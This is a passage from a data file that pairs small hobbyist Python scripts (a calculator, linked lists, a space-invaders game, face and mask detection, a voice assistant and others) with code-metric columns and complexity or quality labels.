                ""Second Number"", ""Please Enter Second Number To Perform Calculation""
            )
        else:

            try:
                if self.opr == ""+"":
                    self.value1 = int(self.value1)
                    self.value2 = int(self.value2)
                    result = self.value1 + self.value2
                    self.out_var.set(result)
                if self.opr == ""-"":
                    self.value1 = int(self.value1)
                    self.value2 = int(self.value2)
                    result = self.value1 - self.value2
                    self.out_var.set(result)
                if self.opr == ""*"":
                    self.value1 = int(self.value1)
                    self.value2 = int(self.value2)
                    result = self.value1 * self.value2
                    self.out_var.set(result)
                if self.opr == ""/"":
                    self.value1 = int(self.value1)
                    self.value2 = int(self.value2)
                    result = self.value1 / self.value2
                    self.out_var.set(result)

            except ValueError:
                messagebox.showinfo(
                    ""Restart"", ""Please Close And Restart Application...Sorry""
                )

    def cal_buttons(self):
        # ===== Row 1 =====
        btn_c = tk.Button(
            self.cal_frame,
            text=""Clear"",
            width=6,
            height=2,
            bd=2,
            bg=""#58a8e0"",
            command=self.press_clear,
        )
        btn_c.grid(row=1, column=0, sticky=tk.W, pady=5)
        btn_div = tk.Button(
            self.cal_frame,
            text=""/"",
            width=6,
            height=2,
            bd=2,
            bg=""#58a8e0"",
            command=self.press_div,
        )
        btn_div.grid(row=1, column=1, sticky=tk.W)
        btn_mul = tk.Button(
            self.cal_frame,
            text=""*"",
            width=6,
            height=2,
            bd=2,
            bg=""#58a8e0"",
            command=self.press_mul,
        )
        btn_mul.grid(row=1, column=2, sticky=tk.E)
        btn_min = tk.Button(
            self.cal_frame,
            text=""-"",
            width=6,
            height=2,
            bd=2,
            bg=""#58a8e0"",
            command=self.press_min,
        )
        btn_min.grid(row=1, column=3, sticky=tk.E)
        # ===== Row 2 =====
        btn_7 = tk.Button(
            self.cal_frame,
            text=""7"",
            width=6,
            height=2,
            bd=2,
            bg=""#90a9b8"",
            command=self.press_7,
        )
        btn_7.grid(row=2, column=0, sticky=tk.W, pady=2)
        btn_8 = tk.Button(
            self.cal_frame,
            text=""8"",
            width=6,
            height=2,
            bd=2,
            bg=""#90a9b8"",
            command=self.press_8,
        )
        btn_8.grid(row=2, column=1, sticky=tk.W)
        btn_9 = tk.Button(
            self.cal_frame,
            text=""9"",
            width=6,
            height=2,
            bd=2,
            bg=""#90a9b8"",
            command=self.press_9,
        )
        btn_9.grid(row=2, column=2, sticky=tk.E)
        btn_plus = tk.Button(
            self.cal_frame,
            text=""+"",
            width=6,
            height=5,
            bd=2,
            bg=""#58a8e0"",
            command=self.press_plus,
        )
        btn_plus.grid(row=2, column=3, sticky=tk.E, rowspan=2)
        # ===== Row 3 =====
        btn_4 = tk.Button(
            self.cal_frame,
            text=""4"",
            width=6,
            height=2,
            bd=2,
            bg=""#90a9b8"",
            command=self.press_4,
        )
        btn_4.grid(row=3, column=0, sticky=tk.W, pady=2)
        btn_5 = tk.Button(
            self.cal_frame,
            text=""5"",
            width=6,
            height=2,
            bd=2,
            bg=""#90a9b8"",
            command=self.press_5,
        )
        btn_5.grid(row=3, column=1, sticky=tk.W)
        btn_6 = tk.Button(
            self.cal_frame,
            text=""6"",
            width=6,
            height=2,
            bd=2,
            bg=""#90a9b8"",
            command=self.press_6,
        )
        btn_6.grid(row=3, column=2, sticky=tk.E)
        # ===== Row 4 =====
        btn_1 = tk.Button(
            self.cal_frame,
            text=""1"",
            width=6,
            height=2,
            bd=2,
            bg=""#90a9b8"",
            command=self.press_1,
        )
        btn_1.grid(row=4, column=0, sticky=tk.W, pady=2)
        btn_2 = tk.Button(
            self.cal_frame,
            text=""2"",
            width=6,
            height=2,
            bd=2,
            bg=""#90a9b8"",
            command=self.press_2,
        )
        btn_2.grid(row=4, column=1, sticky=tk.W)
        btn_3 = tk.Button(
            self.cal_frame,
            text=""3"",
            width=6,
            height=2,
            bd=2,
            bg=""#90a9b8"",
            command=self.press_3,
        )
        btn_3.grid(row=4, column=2, sticky=tk.E)
        btn_equal = tk.Button(
            self.cal_frame,
            text=""="",
            width=6,
            height=5,
            bd=2,
            bg=""orange"",
            command=self.press_equal,
        )
        btn_equal.grid(row=4, column=3, sticky=tk.E, rowspan=2)
        # ===== Row 5 =====
        btn_0 = tk.Button(
            self.cal_frame,
            text=""0"",
            width=14,
            height=2,
            bd=2,
            bg=""#90a9b8"",
            command=self.press_0,
        )
        btn_0.grid(row=5, column=0, sticky=tk.W, pady=2, columnspan=2)
        btn_reset = tk.Button(
            self.cal_frame,
            text=""Reset"",
            width=6,
            height=2,
            bd=2,
            bg=""#90a9b8"",
            command=self.press_reset,
        )
        btn_reset.grid(row=5, column=2, sticky=tk.E)


class Main(tk.Tk):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        # ----- Title -----
        self.title(""Calculator"")
        # -----------------
        # ----- Geometry Settings -----
        self.geometry_settings()
        # -----------------------------

    def geometry_settings(self):
        _com_width = self.winfo_screenwidth()
        _com_height = self.winfo_screenheight()
        _my_width = 360
        _my_height = 350
        _x = int(_com_width / 2 - _my_width / 2)
        _y = int(_com_height / 2 - _my_height / 2)
        geo_string = (
            str(_my_width) + ""x"" + str(_my_height) + ""+"" + str(_x) + ""+"" + str(_y)
        )
        # ----- Setting Now -----
        self.geometry(geo_string)
        self.resizable(width=False, height=False)
        # -----------------------


# =================== Running The Application =======
if __name__ == ""__main__"":
    calculator = Main()
    Inside(calculator)
    calculator.mainloop()
",12284,202,358,29,27,25,0,22.0,47,46,5,92.0,68,,138,425.5571136794599,854.1957891254424,3.3823529411764706,bajo,Yes,False,False,,id213
sqlite_table_check.py,"# Script Name	: sqlite_table_check.py
# Author		: Craig Richards
# Created		: 07 June 2013
# Last Modified	:
# Version		: 1.0

# Modifications	:

# Description	: Checks the main SQLITE database to ensure all the tables should exist


import os
import sqlite3

dropbox = os.getenv(""dropbox"")
config = os.getenv(""my_config"")
dbfile = ""Databases\jarvis.db""
listfile = ""sqlite_master_table.lst""
master_db = os.path.join(dropbox, dbfile)
config_file = os.path.join(config, listfile)
tablelist = open(config_file, ""r"")

conn = sqlite3.connect(master_db)
cursor = conn.cursor()
cursor.execute(""SELECT SQLITE_VERSION()"")
data = cursor.fetchone()

if str(data) == ""(u'3.6.21',)"":
    print(""\nCurrently "" + master_db + "" is on SQLite version: %s"" % data + "" - OK -\n"")
else:
    print(""\nDB On different version than master version - !!!!! \n"")
conn.close()

print(""\nCheckling "" + master_db + "" against "" + config_file + ""\n"")

for table in tablelist.readlines():
    conn = sqlite3.connect(master_db)
    cursor = conn.cursor()
    cursor.execute(
        ""select count(*) from sqlite_master where name = ?"", (table.strip(),)
    )
    res = cursor.fetchone()

    if res[0]:
        print(""[+] Table : "" + table.strip() + "" exists [+]"")
    else:
        print(""[-] Table : "" + table.strip() + ""  does not exist [-]"")
",1359,28,30,10,7,7,0,0.0,0,13,3,26.0,25,,39,120.8512922465316,187.48684196024652,1.56,medio,No,False,False,Low,id214
Crack_password.py,"from random import *
user_pass = input(""Enter your password: "")
password = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j','k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't','u','v','w', 'x', 'y', 'z',]
guess = """"
while (guess != user_pass):
    guess = """"
    for letter in range(len(user_pass)):
        guess_letter = password[randint(0, 25)]
        guess = str(guess_letter) + str(guess)
    print(guess)
print(""Your password is"",guess)
",442,11,11,0,0,0,0,0.0,0,2,2,4.0,4,,6,10.0,15.509775004326936,1.0,medio,No,True,False,Low,id215
singly_linked_list.py,"class Node:
    def __init__(self, data):
        self.data = data
        self.next = None

class LinkedList():
    def __init__(self):
        self.head = None

    def length(self):
        curr = self.head
        count = 0
        while curr.next != None:
            count += 1
            curr = curr.next
        return count

    def add_node(self, data):
        new_node = Node(data)
        if self.head is None:
            self.head = new_node
        else:
            curr = self.head
            while curr.next != None:
                curr = curr.next
            curr.next = new_node

    def insert_at_head(self, data):
        new_node = Node(data)
        temp = self.head
        self.head = new_node
        new_node.next = temp
        del temp

    def insert(self, pos, data):
        if pos < 0 or pos > self.length():
            print(""Enter valid index"")
        elif pos == 0:
            self.insert_at_head(data)
            return
        elif pos == self.length()-1:
            self.add_node(data)
            return
        new_node = Node(data)
        curr_pos = 0
        prev = None
        curr = self.head
        while True:
            if pos == curr_pos:
                prev.next = new_node
                new_node.next = curr
                break
            prev = curr
            curr = curr.next
            curr_pos += 1
        
    def delete_head(self):
        temp = self.head
        self.head = temp.next
        del temp
    
    def delete_end(self):
        curr = self.head
        prev = None
        while True:
            if curr.next == None:
                prev.next = None
                del curr
                break
            prev = curr
            curr = curr.next

    def delete(self, pos):
        if pos < 0 or pos > self.length():
            print(""Enter valid index"")
            return
        elif pos == 0:
            self.delete_head()
            return
        elif pos == self.length()-1:
            self.delete_end()
            return
        curr = self.head
        curr_pos = 0
        prev = None
        while True:
            if curr_pos == pos:
                prev.next = curr.next
                del curr
                break
            prev = curr
            curr = curr.next
            curr_pos += 1

    def display(self):
        if self.head is None:
            print(""List is empty"")
        rev = []
        curr = self.head
        while curr != None:
            print(f""{curr.data} --> "", end='')
            rev.append(curr.data)
            curr = curr.next
        print()
        return rev[::-1]
",2629,97,96,9,0,0,0,10.0,35,24,9,47.0,31,,71,182.109410634974,377.85689473700273,6.82258064516129,bajo,Yes,False,False,Medium-High,id216
greaterno.py,"# Python program to find the largest number among the three input numbers

# change the values of num1, num2 and num3
# for a different result
num1 = 10
num2 = 14
num3 = 12

# uncomment following lines to take three numbers from user
#num1 = float(input(""Enter first number: ""))
#num2 = float(input(""Enter second number: ""))
#num3 = float(input(""Enter third number: ""))

if (num1 >= num2) and (num1 >= num3):
   largest = num1
elif (num2 >= num1) and (num2 >= num3):
   largest = num2
else:
   largest = num3

print(""The largest number is"", largest)
",550,10,10,4,7,7,0,0.0,0,6,2,12.0,7,,18,21.651484454403228,57.058650025961626,1.7142857142857142,alto,No,True,False,Low,id217
power_of_n.py,"# Assign values to author and version.
__author__ = ""Himanshu Gupta""
__version__ = ""1.0.0""
__date__ = ""2023-09-03""

def binaryExponentiation(x: float, n: int) -> float:
    """"""
    Function to calculate x raised to the power n (i.e., x^n) where x is a float number and n is an integer and it will return float value

    Example 1:

    Input: x = 2.00000, n = 10
    Output: 1024.0
    Example 2:

    Input: x = 2.10000, n = 3
    Output: 9.261000000000001

    Example 3:

    Input: x = 2.00000, n = -2
    Output: 0.25
    Explanation: 2^-2 = 1/(2^2) = 1/4 = 0.25
    """"""

    if n == 0:
        return 1

    # Handle case where, n < 0.
    if n < 0:
        n = -1 * n
        x = 1.0 / x

    # Perform Binary Exponentiation.
    result = 1
    while n != 0:
        # If 'n' is odd we multiply result with 'x' and reduce 'n' by '1'.
        if n % 2 == 1:
            result *= x
            n -= 1
        # We square 'x' and reduce 'n' by half, x^n => (x^2)^(n/2).
        x *= x
        n //= 2
    return result


if __name__ == ""__main__"":
    print(f""Author: {__author__}"")
    print(f""Version: {__version__}"")
    print(f""Function Documentation: {binaryExponentiation.__doc__}"")
    print(f""Date: {__date__}"")
    
    print() # Blank Line

    print(binaryExponentiation(2.00000, 10))
    print(binaryExponentiation(2.10000, 3))
    print(binaryExponentiation(2.00000, -2))
 ",1392,27,26,14,6,5,13,1.0,5,14,9,26.0,11,,40,66.58307281799108,172.8771237954945,10.636363636363637,alto,No,False,False,Medium,id218
passwordGenerator.py,"# PasswordGenerator GGearing 314 01/10/19
# modified Prince Gangurde 4/4/2020

from random import randint

case = randint(1, 2)
number = randint(1, 99)

specialCharacters = (
    ""!"",
    ""@"",
    ""#"",
    ""$"",
    ""%"",
    ""/"",
    ""?"",
    "":"",
    ""<"",
    "">"",
    ""|"",
    ""&"",
    ""*"",
    ""-"",
    ""="",
    ""+"",
    ""_"",
)

animals = (
    ""ant"",
    ""alligator"",
    ""baboon"",
    ""badger"",
    ""barb"",
    ""bat"",
    ""beagle"",
    ""bear"",
    ""beaver"",
    ""bird"",
    ""bison"",
    ""bombay"",
    ""bongo"",
    ""booby"",
    ""butterfly"",
    ""bee"",
    ""camel"",
    ""cat"",
    ""caterpillar"",
    ""catfish"",
    ""cheetah"",
    ""chicken"",
    ""chipmunk"",
    ""cow"",
    ""crab"",
    ""deer"",
    ""dingo"",
    ""dodo"",
    ""dog"",
    ""dolphin"",
    ""donkey"",
    ""duck"",
    ""eagle"",
    ""earwig"",
    ""elephant"",
    ""emu"",
    ""falcon"",
    ""ferret"",
    ""fish"",
    ""flamingo"",
    ""fly"",
    ""fox"",
    ""frog"",
    ""gecko"",
    ""gibbon"",
    ""giraffe"",
    ""goat"",
    ""goose"",
    ""gorilla"",
)

colour = (
    ""red"",
    ""orange"",
    ""yellow"",
    ""green"",
    ""blue"",
    ""indigo"",
    ""violet"",
    ""purple"",
    ""magenta"",
    ""cyan"",
    ""pink"",
    ""brown"",
    ""white"",
    ""grey"",
    ""black"",
)

chosenanimal = animals[
    randint(0, len(animals) - 1)
]  # randint will return max lenght but , tuple has index from 0 to len-1
chosencolour = colour[randint(0, len(colour) - 1)]
chosenSpecialCharacter = specialCharacters[randint(0, len(specialCharacters) - 1)]

if case == 1:
    chosenanimal = chosenanimal.upper()
    print(chosencolour, number, chosenanimal, chosenSpecialCharacter)
else:
    chosencolour = chosencolour.upper()
    print(chosenanimal, number, chosencolour, chosenSpecialCharacter)
",1716,15,101,7,3,2,0,0.0,0,4,2,8.0,5,,12,13.60964047443681,33.68825906469125,1.6,medio,No,False,False,Low,id219
main.py,"# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.


def print_hi(name):
    # Use a breakpoint in the code line below to debug your script.
    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    print_hi('PyCharm')

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
",528,4,4,6,7,6,0,1.0,1,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,alto,No,False,False,Low,id220
face_recofnation_first.py,"## Name - Soumyajit Chakraborty
## place - kolkata
## date - 10 / 08 / 2020

import cv2 as cv

face_cascade = cv.CascadeClassifier(""..\libs\haarcascade_frontalface_default.xml"")
face_cascade_eye = cv.CascadeClassifier(""..\libs\haarcascade_eye.xml"")
# face_glass = cv.CascadeClassifier('..\libs\haarcascade_eye_tree_eyeglasses.xml')

cap = cv.VideoCapture(0)
while cap.isOpened():

    falg, img = cap.read()  # start reading the camera output i mean frames
    # cap.read() returning a bool value and a frame onject type value

    gray = cv.cvtColor(
        img, cv.COLOR_BGR2GRAY
    )  # converting to grayscale image to perform smoother
    faces = face_cascade.detectMultiScale(
        img, 1.1, 7
    )  # we use detectMultiscale library function to detect the predefined structures of a face
    eyes = face_cascade_eye.detectMultiScale(img, 1.1, 7)
    # using for loops we are trying to read each and every frame and map
    for (x, y, w, h) in faces:
        cv.rectangle(img, (x, y), (x + w, y + h), (0, 255, 0), 1)

    for (a, b, c, d) in eyes:
        cv.rectangle(img, (a, b), (a + c, b + d), (255, 0, 0), 1)

    cv.imshow(""img"", img)
    c = cv.waitKey(1)
    if c == ord(""q""):
        break

cv.release()
cv.destroyAllWindows()
",1248,19,23,8,9,6,0,0.0,0,5,2,10.0,9,,15,30.529325012980813,51.89147427955947,1.1111111111111112,alto,No,False,False,Low,id221
mask_detection.py,"import tensorflow.keras
from PIL import Image, ImageOps
import numpy as np
import cv2

# import os

str = """"
faceCascade = cv2.CascadeClassifier(""Resources/haarcascade_frontalface_default.xml"")

np.set_printoptions(suppress=True)
model = tensorflow.keras.models.load_model(""Resources/keras_model.h5"")
data = np.ndarray(shape=(1, 224, 224, 3), dtype=np.float32)


cap = cv2.VideoCapture(0)
cap.set(3, 640)
cap.set(4, 480)
while True:
    success, img = cap.read()

    cv2.imshow(""webcam"", img)
    faces = faceCascade.detectMultiScale(img, 1.1, 4)

    for (x, y, w, h) in faces:
        crop_img = img[y : y + h, x : x + w]
        crop_img = cv2.resize(crop_img, (224, 224))
        normalized_image_array = (crop_img.astype(np.float32) / 127.0) - 1
        data[0] = normalized_image_array
        prediction = model.predict(data)
        print(prediction)
        if prediction[0][0] > prediction[0][1]:
            str = ""Mask""
        else:
            str = ""Without-mask""

        cv2.rectangle(img, (x, y), (x + w, y + h), (255, 0, 0), 2)
        cv2.putText(img, str, (x, y), cv2.FONT_HERSHEY_COMPLEX, 1, (0, 150, 0), 1)
        cv2.imshow(""Result"", img)

    if cv2.waitKey(1) & 0xFF == ord(""q""):
        break
",1222,33,32,9,1,1,0,0.0,0,9,6,18.0,14,,27,68.81274391313339,116.6920585619588,3.857142857142857,medio,No,False,False,Low,id222
testlines.py,"# Script Name		: testlines.py
# Author		: Craig Richards
# Created		: 08th December 2011
# Last Modified		:
# Version		: 1.0

# Modifications		: beven nyamande

# Description		: This is a very simple script that opens up a file and writes whatever is set ""


def write_to_file(filename, txt):
    with open(filename, ""w"") as file_object:
        s = file_object.write(txt)


if __name__ == ""__main__"":
    write_to_file(""test.txt"", ""I am beven"")
",446,5,5,6,7,7,0,1.0,1,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,alto,No,False,False,Low,id223
pattern5.py,"#pattern Reverse piramid of numbers
#1
#21
#321
#4321
#54321

def main():
    lines = int(input(""Enter the number of lines: ""))
    pattern(lines)

def pattern(rows):
    for i in range(1, rows+1):
        for j in range(i, 0, -1):
            print(j, end="""")
        print()

if __name__ == ""__main__"":
    main()
",316,10,10,3,6,6,0,2.0,4,3,3,5.0,4,,8,12.75488750216347,22.458839376460837,1.875,alto,No,True,False,Low,id224
Add_two_Linked_List.py,"class Node:
    def __init__(self, data):
        self.data = data
        self.next = None


class LinkedList:
    def __init__(self):
        self.head = None

    def insert_at_beginning(self, new_data):
        new_node = Node(new_data)
        if self.head is None:
            self.head = new_node
            return
        new_node.next = self.head
        self.head = new_node

    def add_two_no(self, first, second):
        prev = None
        temp = None
        carry = 0
        while first is not None or second is not None:
            first_data = 0 if first is None else first.data
            second_data = 0 if second is None else second.data
            Sum = carry + first_data + second_data
            carry = 1 if Sum >= 10 else 0
            Sum = Sum if Sum < 10 else Sum % 10
            temp = Node(Sum)
            if self.head is None:
                self.head = temp
            else:
                prev.next = temp
            prev = temp
            if first is not None:
                first = first.next
            if second is not None:
                second = second.next
        if carry > 0:
            temp.next = Node(carry)

    def __str__(self):
        temp = self.head
        while temp:
            print(temp.data, ""->"", end="" "")
            temp = temp.next
        return ""None""


if __name__ == ""__main__"":
    first = LinkedList()
    second = LinkedList()
    first.insert_at_beginning(6)
    first.insert_at_beginning(4)
    first.insert_at_beginning(9)

    second.insert_at_beginning(2)
    second.insert_at_beginning(2)

    print(""First Linked List: "")
    print(first)
    print(""Second Linked List: "")
    print(second)

    result = LinkedList()
    result.add_two_no(first.head, second.head)
    print(""Final Result: "")
    print(result)
",1878,58,58,10,0,0,0,5.0,24,16,9,32.0,17,,48,98.0161933142366,225.62110647077245,8.470588235294118,bajo,Yes,False,False,Medium,id225
sensors_information.py,"import argparse
import sys
import socket
import psutil


def python_version():
    return sys.version_info


def ip_addresses():
    hostname = socket.gethostname()
    addresses = socket.getaddrinfo(hostname, None)

    address_info = []
    for address in addresses:
        address_info.append((address[0].name, address[4][0]))
    return address_info


def cpu_load():
    return psutil.cpu_percent(interval=0.1)


def ram_available():
    return psutil.virtual_memory().available


def ac_connected():
    return psutil.sensors_battery().power_plugged


def show_sensors():
    print(""Python Version:{0.major}.{0.minor}"".format(python_version()))
    for address in ip_addresses():
        print(""IP Addresses: {0[1]} ({0[0]})"".format(address))
    print(""CPU Load: {:.1f}"".format(cpu_load()))
    print(""RAM Available: {} MiB"".format(ram_available() / 1024 ** 2))
    print(""AC Connected: {}"".format(ac_connected()))


def command_line(argv):
    parser = argparse.ArgumentParser(
        description=""Display the values of the sensors"",
        add_help=True,
    )
    arguments = parser.parse_args()
    show_sensors()


if __name__ == ""__main__"":
    command_line(sys.argv)
",1184,32,35,17,0,0,0,7.0,9,3,3,6.0,6,,9,20.264662506490406,28.529325012980813,1.5,medio,No,False,False,Low,id226
checker_board.py,"""""""
Author : Dhruv B Kakadiya

""""""

import pygame as pg
from .statics import *
from .pieces import *

# checker board creation
class checker_board:
    def __init__(self):
        self.board = []
        self.selected = None
        self.black_l = self.white_l = 12
        self.black_k = self.white_k = 0
        self.create_board()

    # to design the board
    def draw_cubes(self, window):
        window.fill(green)
        for row in range(rows):
            for col in range(row % 2, cols, 2):
                pg.draw.rect(
                    window, yellow, (row * sq_size, col * sq_size, sq_size, sq_size)
                )

    def move(self, piece, row, col):
        self.board[piece.row][piece.col], self.board[row][col] = (
            self.board[row][col],
            self.board[piece.row][piece.col],
        )
        piece.move(row, col)
        if row == rows - 1 or row == 0:
            piece.make_king()
            if piece.color == white:
                self.white_k += 1
            else:
                self.black_k += 1

    # to get piece whatever they want
    def get_piece(self, row, col):
        return self.board[row][col]

    def create_board(self):
        for row in range(rows):
            self.board.append([])
            for col in range(cols):
                if col % 2 == ((row + 1) % 2):
                    if row < 3:
                        self.board[row].append(pieces(row, col, white))
                    elif row > 4:
                        self.board[row].append(pieces(row, col, black))
                    else:
                        self.board[row].append(0)
                else:
                    self.board[row].append(0)

    def draw(self, window):
        self.draw_cubes(window)
        for row in range(rows):
            for col in range(cols):
                piece = self.board[row][col]
                if piece != 0:
                    piece.draw(window)

    def get_valid_moves(self, piece):
        moves = {}
        l = piece.col - 1
        r = piece.col + 1
        row = piece.row

        if piece.color == black or piece.king:
            moves.update(
                self._traverse_l(row - 1, max(row - 3, -1), -1, piece.color, l)
            )
            moves.update(
                self._traverse_r(row - 1, max(row - 3, -1), -1, piece.color, r)
            )

        if piece.color == white or piece.king:
            moves.update(
                self._traverse_l(row + 1, min(row + 3, rows), 1, piece.color, l)
            )
            moves.update(
                self._traverse_r(row + 1, min(row + 3, rows), 1, piece.color, r)
            )

        return moves

    def remove(self, pieces):
        for piece in pieces:
            self.board[piece.row][piece.col] = 0
            if piece != 0:
                if piece.color == black:
                    self.black_l -= 1
                else:
                    self.white_l -= 1

    def winner(self):
        if self.black_l <= 0:
            return white
        elif self.white_l <= 0:
            return black
        return None

    # Traversal Left
    def _traverse_l(self, start, stop, step, color, l, skip=[]):
        moves = {}
        last = []
        for r in range(start, stop, step):
            if l < 0:
                break
            current = self.board[r][l]
            if current == 0:
                if skip and not last:
                    break
                elif skip:
                    moves[(r, l)] = last + skip
                else:
                    moves[(r, l)] = last

                if last:
                    if step == -1:
                        row = max(r - 3, 0)
                    else:
                        row = min(r + 3, rows)
                    moves.update(
                        self._traverse_l(r + step, row, step, color, l - 1, skip=last)
                    )
                    moves.update(
                        self._traverse_r(r + step, row, step, color, l + 1, skip=last)
                    )
                break

            elif current.color == color:
                break
            else:
                last = [current]
            l -= 1
        return moves

    # Traversal Right
    def _traverse_r(self, start, stop, step, color, right, skip=[]):
        moves = {}
        last = []
        for r in range(start, stop, step):
            if right >= cols:
                break
            current = self.board[r][right]
            if current == 0:
                if skip and not last:
                    break
                elif skip:
                    moves[(r, right)] = last + skip
                else:
                    moves[(r, right)] = last

                if last:
                    if step == -1:
                        row = max(r - 3, 0)
                    else:
                        row = min(r + 3, rows)
                    moves.update(
                        self._traverse_l(
                            r + step, row, step, color, right - 1, skip=last
                        )
                    )
                    moves.update(
                        self._traverse_r(
                            r + step, row, step, color, right + 1, skip=last
                        )
                    )
                break

            elif current.color == color:
                break
            else:
                last = [current]
            right += 1
        return moves
",5491,129,153,20,5,5,3,11.0,56,71,14,134.0,71,,205,489.9350143936389,1313.925141908229,13.211267605633802,bajo,Yes,False,False,,id227
Counting Sort.py,"# Python program for counting sort


def countingSort(array):
    size = len(array)
    output = [0] * size

    # Initialize count array
    count = [0] * 10

    # Store the count of each elements in count array
    for i in range(0, size):
        count[array[i]] += 1

    # Store the cummulative count
    for i in range(1, 10):
        count[i] += count[i - 1]

    # Find the index of each element of the original array in count array
    # place the elements in output array
    i = size - 1
    while i >= 0:
        output[count[array[i]] - 1] = array[i]
        count[array[i]] -= 1
        i -= 1

    # Copy the sorted elements into original array
    for i in range(0, size):
        array[i] = output[i]


data = [4, 2, 2, 8, 3, 3, 1]
countingSort(data)
print(""Sorted Array in Ascending Order: "")
print(data)

# This code is contributed by mohd-mehraj.
",868,19,19,10,8,8,0,,5,10,4,20.0,12,,30,51.01955000865388,120.0,3.333333333333333,alto,No,False,False,Low,id228
python Space Invader game.py,"import pygame
import random
import math
from pygame import mixer

# initialization

pygame.init()

# create the screen
screen = pygame.display.set_mode((800, 620))

# background

background = pygame.image.load('background.png')

#bg sound
mixer.music.load('background.wav')
mixer.music.play(-1)

# title and icon
pygame.display.set_caption(""Space Invendera"")
icon = pygame.image.load('battleship.png')
pygame.display.set_icon(icon)

# player
playerimg = pygame.image.load('transport.png')
playerx = 370
playery = 480
playerx_change = 0

# enemy
enemyimg = []
enemyx = []
enemyy = []
enemyx_change = []
enemyy_change = []
number_of_enemies = 6

for i in range(number_of_enemies):
    enemyimg.append(pygame.image.load('enemy.png'))
    enemyx.append(random.randint(0, 800))
    enemyy.append(random.randint(50, 150))
    enemyx_change.append(2.5)
    enemyy_change.append(40)

# bullet
bulletimg = pygame.image.load('bullet.png')
bulletx = 0
bullety = 480
bulletx_change = 0
bullety_change = 10
bullet_state = ""ready""

#score
score_value = 0
font = pygame.font.Font('freesansbold.ttf',32)
textx = 10
texty = 10

#game over txt
over_font = pygame.font.Font('freesansbold.ttf',64)

def show_score(x ,y):
    score = font.render(""score :""+ str(score_value),True, (255, 255, 255))
    screen.blit(score, (x, y))

def game_over_text():
    over_txt = over_font.render(""GAME OVER"", True, (255, 255, 255))
    screen.blit(over_txt, (200, 250))

# for display player img
def player(x, y):
    screen.blit(playerimg, (x, y))


# foe desplaing enemy img

def enemy(x, y ,i):
    screen.blit(enemyimg[i], (x, y))


def fire_bullet(x, y):
    global bullet_state
    bullet_state = ""fire""
    screen.blit(bulletimg, (x + 16, y + 10))


def iscollision(enemyx, enemyy, bulletx, bullety):
    distance = math.sqrt((math.pow(enemyx - bulletx, 2)) + (math.pow(enemyy - bullety, 2)))
    if distance < 27:
        return True
    else:
        return False


# game loop
running = True
while running:

    screen.fill((0, 0, 0))
    # for bg img
    screen.blit(background, (0, 0))

    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False

        # if keystroke in pressed whether it is right of left
        if (event.type == pygame.KEYDOWN):
            if (event.key == pygame.K_LEFT):
                playerx_change = -5
            if (event.key == pygame.K_RIGHT):
                playerx_change = 5

            if (event.key == pygame.K_SPACE):
                if bullet_state == ""ready"":
                    bullet_sound = mixer.Sound('laser.wav')
                    bullet_sound.play()
                    bulletx = playerx
                    fire_bullet(bulletx, bullety)

        if (event.type == pygame.KEYUP):
            if event.key == pygame.K_LEFT or event.key == pygame.K_RIGHT:
                playerx_change = 0

    playerx += playerx_change
    # create boundry for player
    if playerx <= 0:
        playerx = 0
    elif playerx >= 736:
        playerx = 736

    for i in range(number_of_enemies):

        #game over
        if enemyy[i] > 440:
            for j in range(number_of_enemies):
                enemyy[j] = 2000
            game_over_text()
            break

        enemyx[i] += enemyx_change[i]
        # create boundry for enemy
        if enemyx[i] <= 0:
            enemyx_change[i] = 2.5
            enemyy[i] += enemyy_change[i]
        elif enemyx[i] >= 736:
            enemyx_change[i] = -2.5
            enemyy[i] += enemyy_change[i]

        # collision
        collision = iscollision(enemyx[i], enemyy[i], bulletx, bullety)
        if collision:
            explossion_sound = mixer.Sound('explosion.wav')
            explossion_sound.play()
            bullety = 480
            bullet_state = ""ready""
            score_value += 1
            enemyx[i] = random.randint(0, 800)
            enemyy[i] = random.randint(50, 150)

        enemy(enemyx[i], enemyy[i], i)

    # bullet movement
    if bullety <= 0:
        bullety = 480
        bullet_state = ""ready""

    if bullet_state == ""fire"":
        fire_bullet(bulletx, bullety)
        bullety -= bullety_change

    player(playerx, playery)
    show_score(textx,texty)
    pygame.display.update()
",4242,117,117,39,20,20,0,6.0,7,33,9,63.0,47,,96,289.59500104182973,557.50607251753,6.031914893617022,bajo,No,False,True,Medium-High,id229
VoiceAssistant_main.py,"from speakListen import *
from websiteWork import *
from textRead import *
from dictator import *
from menu import *
from speechtotext import *
from TextTospeech import *


def main():
    start = 0
    end = 0
    if start == 0:
        print(""\nSay \""Hello Python\"" to activate the Voice Assistant!"")
        start += 1
    while True:
        
        q = short_hear().lower()
        if ""close"" in q:
            greet(""end"")
            exit(0)
        if ""hello python"" in q:
            greet(""start"")
            print_menu()
            while True:
                
                query = hear().lower()
                if ""close"" in query:
                    greet(""end"")
                    end += 1
                    return 0
                elif ""text to speech"" in query:
                    tts()
                    time.sleep(4)
                    

                elif ""search on google"" in query or ""search google"" in query or ""google"" in query:
                    google_search()
                    time.sleep(10)
                    
                elif ""search on wikipedia"" in query or ""search wikipedia"" in query or ""wikipedia"" in query:
                    wiki_search()
                    time.sleep(10)
                    
                elif ""word"" in query:
                    ms_word()
                    time.sleep(5)
                    
                elif ""book"" in query:
                    pdf_read()
                    time.sleep(10)
                   
                elif ""speech to text"" in query:
                    big_text()
                    time.sleep(5)
                    
                else:
                    print(""I could'nt understand what you just said!"")
                    speak(""I could'nt understand what you just said!"")
                
                print(""\nDo you want to continue? if yes then say "" + Fore.YELLOW + ""\""YES\"""" + Fore.WHITE + "" else say "" + Fore.YELLOW + ""\""CLOSE PYTHON\"""")
                speak(""Do you want to continue? if yes then say YES else say CLOSE PYTHON"")
                qry = hear().lower()
                if ""yes"" in qry:
                    print_menu()
                elif ""close"" in qry:
                    greet(""end"")
                    return 0
                else:
                    speak(""You didn't say a valid command. So I am continuing!"")
                    continue

        elif ""close"" in q:
            return 0
        else:
            continue

main()
